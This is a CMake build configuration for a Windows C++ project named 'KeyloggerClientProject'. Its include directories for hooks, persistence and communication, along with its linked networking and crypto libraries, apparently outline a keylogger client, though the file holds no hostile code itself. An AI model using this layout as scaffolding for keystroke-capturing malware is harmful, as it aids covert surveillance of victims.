cmake_minimum_required(VERSION 3.15)
project(KeyloggerClientProject VERSION 1.0.0 LANGUAGES CXX)

# ========================================
#           PROJECT CONFIGURATION
# ========================================

# Build configuration
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Build type
if(NOT CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Debug)
endif()

# Output configuration
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin")
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib")
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib")

message(STATUS "╔══════════════════════════════════════╗")
message(STATUS "║     KeyloggerClientProject v${PROJECT_VERSION}     ║")
message(STATUS "╚══════════════════════════════════════╝")
message(STATUS "Build Type    : ${CMAKE_BUILD_TYPE}")
message(STATUS "Compiler      : ${CMAKE_CXX_COMPILER_ID} ${CMAKE_CXX_COMPILER_VERSION}")
message(STATUS "Generator     : ${CMAKE_GENERATOR}")
message(STATUS "Source Dir    : ${CMAKE_SOURCE_DIR}")
message(STATUS "Binary Dir    : ${CMAKE_BINARY_DIR}")

# ========================================
#           OPENSSL CONFIGURATION
# ========================================

# Manual OpenSSL configuration (more reliable than FindOpenSSL)
set(OPENSSL_ROOT_DIR "C:/Program Files/OpenSSL-Win64")
set(OPENSSL_INCLUDE_DIR "C:/Program Files/OpenSSL-Win64/include")
set(OPENSSL_SSL_LIBRARY "C:/Program Files/OpenSSL-Win64/lib/VC/x64/MD/libssl.lib")
set(OPENSSL_CRYPTO_LIBRARY "C:/Program Files/OpenSSL-Win64/lib/VC/x64/MD/libcrypto.lib")
set(OPENSSL_LIBRARIES "${OPENSSL_SSL_LIBRARY};${OPENSSL_CRYPTO_LIBRARY}")
set(OPENSSL_FOUND TRUE)

message(STATUS "")
message(STATUS "OpenSSL Configuration:")
message(STATUS "  Root Dir      : ${OPENSSL_ROOT_DIR}")
message(STATUS "  Include Dir   : ${OPENSSL_INCLUDE_DIR}")
message(STATUS "  SSL Library   : ${OPENSSL_SSL_LIBRARY}")
message(STATUS "  Crypto Library: ${OPENSSL_CRYPTO_LIBRARY}")

# Verify OpenSSL files exist
set(OPENSSL_VERIFICATION_FAILED FALSE)
foreach(path "${OPENSSL_INCLUDE_DIR}" "${OPENSSL_SSL_LIBRARY}" "${OPENSSL_CRYPTO_LIBRARY}")
    if(NOT EXISTS "${path}")
        message(SEND_ERROR "OpenSSL path does not exist: ${path}")
        set(OPENSSL_VERIFICATION_FAILED TRUE)
    endif()
endforeach()

if(OPENSSL_VERIFICATION_FAILED)
    message(FATAL_ERROR "OpenSSL configuration verification failed!")
endif()

# Additional OpenSSL verification
if(EXISTS "${OPENSSL_INCLUDE_DIR}/openssl/ssl.h")
    message(STATUS "  ✓ SSL headers found")
else()
    message(SEND_ERROR "  ✗ SSL headers missing")
endif()

# ========================================
#         INCLUDE DIRECTORIES
# ========================================

include_directories(
    # Project includes
    include
    include/core
    include/data
    include/hooks
    include/security  
    include/utils
    include/communication
    include/persistence
    
    # OpenSSL includes
    "${OPENSSL_INCLUDE_DIR}"
)

# ========================================
#            SOURCE FILES
# ========================================

# Find all source files recursively
file(GLOB_RECURSE ALL_SOURCES 
    "src/*.cpp"
    "src/*.cxx"
    "src/*.cc"
)

# Filter existing source files
set(SOURCES)
foreach(source_file ${ALL_SOURCES})
    if(EXISTS "${source_file}")
        list(APPEND SOURCES "${source_file}")
    endif()
endforeach()

# Ensure we have at least main.cpp
if(NOT SOURCES)
    if(EXISTS "${CMAKE_SOURCE_DIR}/src/main.cpp")
        set(SOURCES src/main.cpp)
    else()
        message(FATAL_ERROR "No source files found! Ensure src/main.cpp exists.")
    endif()
endif()

message(STATUS "")
message(STATUS "Source Files:")
foreach(source ${SOURCES})
    file(RELATIVE_PATH rel_source "${CMAKE_SOURCE_DIR}" "${source}")
    message(STATUS "  ${rel_source}")
endforeach()

# ========================================
#         EXECUTABLE CREATION
# ========================================

add_executable(KeyloggerClientProject ${SOURCES})

# C++ features
target_compile_features(KeyloggerClientProject PRIVATE cxx_std_17)

# ========================================
#         COMPILER CONFIGURATION
# ========================================

# Platform-specific definitions
if(WIN32)
    target_compile_definitions(KeyloggerClientProject PRIVATE
        # Windows API
        WIN32_LEAN_AND_MEAN
        NOMINMAX
        _WIN32_WINNT=0x0601  # Windows 7+
        WINVER=0x0601
        
        # Unicode support
        UNICODE
        _UNICODE
        
        # Security
        _CRT_SECURE_NO_WARNINGS
        _SCL_SECURE_NO_WARNINGS
        
        # Project specific
        OPENSSL_CONFIGURED=1
    )
endif()

# Compiler-specific settings
if(CMAKE_CXX_COMPILER_ID STREQUAL "GNU")
    target_compile_options(KeyloggerClientProject PRIVATE
        # Warnings
        -Wall -Wextra -Wpedantic
        -Wno-unused-parameter
        -Wno-missing-field-initializers
        -Wno-unknown-pragmas
        
        # Optimization
        $<$<CONFIG:Debug>:-g -O0 -DDEBUG>
        $<$<CONFIG:Release>:-O3 -DNDEBUG -march=native>
        $<$<CONFIG:MinSizeRel>:-Os -DNDEBUG>
        $<$<CONFIG:RelWithDebInfo>:-O2 -g -DNDEBUG>
        
        # Additional flags for Windows
        -static-libgcc
        -static-libstdc++
    )
    
    # Linker flags for MinGW
    target_link_options(KeyloggerClientProject PRIVATE
        -static-libgcc
        -static-libstdc++
        -Wl,--enable-stdcall-fixup
    )
    
elseif(CMAKE_CXX_COMPILER_ID STREQUAL "Clang")
    target_compile_options(KeyloggerClientProject PRIVATE
        -Wall -Wextra
        -Wno-unused-parameter
        $<$<CONFIG:Debug>:-g -O0 -DDEBUG>
        $<$<CONFIG:Release>:-O3 -DNDEBUG>
    )
endif()

# ========================================
#           LIBRARY LINKING
# ========================================

if(WIN32)
    # Link OpenSSL libraries (must come first)
    target_link_libraries(KeyloggerClientProject PRIVATE
        "${OPENSSL_SSL_LIBRARY}"
        "${OPENSSL_CRYPTO_LIBRARY}"
    )
    
    # Core Windows libraries
    target_link_libraries(KeyloggerClientProject PRIVATE
        # Essential Windows APIs
        kernel32 user32 gdi32 winspool shell32 ole32 oleaut32 uuid
        comdlg32 advapi32 
        
        # Network and communication
        winhttp wininet ws2_32 wsock32 dnsapi iphlpapi
        
        # Security and cryptography
        crypt32 secur32 authz
        
        # System information and management
        psapi version netapi32 wtsapi32 userenv
        
        # Additional utilities
        shlwapi gdiplus comctl32 winmm
        
        # Low-level system access
        ntdll setupapi devmgr
    )
    
    # Set subsystem based on build type
    if(CMAKE_BUILD_TYPE STREQUAL "Debug")
        set_target_properties(KeyloggerClientProject PROPERTIES
            LINK_FLAGS "-Wl,--subsystem,console"
        )
    else()
        # For release, you might want GUI subsystem
        set_target_properties(KeyloggerClientProject PROPERTIES  
            LINK_FLAGS "-Wl,--subsystem,console"  # Change to windows for GUI app
        )
    endif()
    
    # Additional Windows-specific configuration
    set_target_properties(KeyloggerClientProject PROPERTIES
        WIN32_EXECUTABLE TRUE
    )
endif()

# ========================================
#         OUTPUT CONFIGURATION
# ========================================

# Per-configuration output directories
foreach(config Debug Release MinSizeRel RelWithDebInfo)
    string(TOUPPER ${config} config_upper)
    set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_${config_upper} "${CMAKE_BINARY_DIR}/bin")
    set(CMAKE_LIBRARY_OUTPUT_DIRECTORY_${config_upper} "${CMAKE_BINARY_DIR}/lib")
    set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY_${config_upper} "${CMAKE_BINARY_DIR}/lib")
endforeach()

# Create necessary directories
file(MAKE_DIRECTORY "${CMAKE_BINARY_DIR}/bin")
file(MAKE_DIRECTORY "${CMAKE_BINARY_DIR}/lib")
file(MAKE_DIRECTORY "${CMAKE_BINARY_DIR}/logs")

# Copy resources if they exist
if(EXISTS "${CMAKE_SOURCE_DIR}/resources")
    file(COPY "${CMAKE_SOURCE_DIR}/resources" 
         DESTINATION "${CMAKE_BINARY_DIR}")
    message(STATUS "Resources copied to build directory")
endif()

# ========================================
#         DEVELOPMENT HELPERS
# ========================================

# Enable compile commands for IDE support
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# Custom targets for development
add_custom_target(run
    COMMAND KeyloggerClientProject
    DEPENDS KeyloggerClientProject
    WORKING_DIRECTORY ${CMAKE_BINARY_DIR}/bin
    COMMENT "Running KeyloggerClientProject"
)

add_custom_target(debug
    COMMAND gdb ${CMAKE_BINARY_DIR}/bin/KeyloggerClientProject
    DEPENDS KeyloggerClientProject
    WORKING_DIRECTORY ${CMAKE_BINARY_DIR}/bin
    COMMENT "Debug KeyloggerClientProject with GDB"
)

add_custom_target(clean-all
    COMMAND ${CMAKE_COMMAND} --build . --target clean
    COMMAND ${CMAKE_COMMAND} -E remove_directory ${CMAKE_BINARY_DIR}/bin
    COMMAND ${CMAKE_COMMAND} -E remove_directory ${CMAKE_BINARY_DIR}/lib
    WORKING_DIRECTORY ${CMAKE_BINARY_DIR}
    COMMENT "Deep clean build artifacts"
)

# ========================================
#         INSTALL CONFIGURATION
# ========================================

install(TARGETS KeyloggerClientProject 
    RUNTIME DESTINATION bin
    LIBRARY DESTINATION lib
    ARCHIVE DESTINATION lib
)

# Install resources
if(EXISTS "${CMAKE_SOURCE_DIR}/resources")
    install(DIRECTORY "${CMAKE_SOURCE_DIR}/resources/"
        DESTINATION "resources"
    )
endif()

# ========================================
#           FINAL SUMMARY
# ========================================

message(STATUS "")
message(STATUS "╔══════════════════════════════════════╗")
message(STATUS "║         Configuration Summary        ║")
message(STATUS "╚══════════════════════════════════════╝")
message(STATUS "Project       : ${PROJECT_NAME}")
message(STATUS "Version       : ${PROJECT_VERSION}")
message(STATUS "Build Type    : ${CMAKE_BUILD_TYPE}")
message(STATUS "Compiler      : ${CMAKE_CXX_COMPILER}")
message(STATUS "Output Dir    : ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}")
message(STATUS "OpenSSL Root  : ${OPENSSL_ROOT_DIR}")
message(STATUS "Install Prefix: ${CMAKE_INSTALL_PREFIX}")
message(STATUS "")
message(STATUS "Custom Targets Available:")
message(STATUS "  make run      - Run the application")
message(STATUS "  make debug    - Debug with GDB")
message(STATUS "  make clean-all- Deep clean")
message(STATUS "")
